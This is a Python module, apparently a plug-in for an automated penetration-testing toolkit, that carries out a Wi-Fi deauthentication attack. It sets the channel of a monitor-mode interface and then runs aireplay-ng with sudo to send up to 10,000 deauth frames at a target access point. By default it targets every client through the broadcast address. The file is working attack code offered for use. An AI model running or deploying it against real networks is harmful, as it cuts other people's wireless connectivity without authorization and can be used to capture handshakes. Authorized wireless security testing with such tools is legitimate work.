import subprocess
import logging
import time

from logger import Logger
logger = Logger(name="wifi_deauth.py", level=logging.DEBUG)
b_class = "WiFiDeauth"
b_module = "wifi_deauth"
b_status = "wifi_deauth"
b_port = 0
b_parent = None


class WiFiDeauth:
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.interface = shared_data.config.get("monitor_interface", "wlan0mon")

    def deauth(self, bssid, client="ff:ff:ff:ff:ff:ff", count=10, channel=None):
        try:
            import re
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                raise ValueError("Invalid BSSID format")
            if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', client):
                raise ValueError("Invalid client MAC format")
            if not isinstance(count, int) or count < 1 or count > 10000:
                raise ValueError("Count must be between 1 and 10000")
            if channel:
                subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)],
                               capture_output=True, timeout=5)
            cmd = [
                'sudo', 'aireplay-ng', '--deauth', str(count),
                '-a', bssid,
                '-c', client,
                self.interface
            ]
            deauth_timeout = max(30, count * 3)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=deauth_timeout)
            if result.returncode == 0:
                logger.info(f"Deauth attack sent to {bssid}")
                return True
            logger.error(f"Deauth failed: {result.stderr}")
            return False
        except subprocess.TimeoutExpired:
            logger.warning("Deauth attack timed out")
            return False
        except Exception as e:
            logger.error(f"Deauth error: {e}")
            return False

    def execute(self, ip="", port="", row=None, status_key=""):
        return 'success'
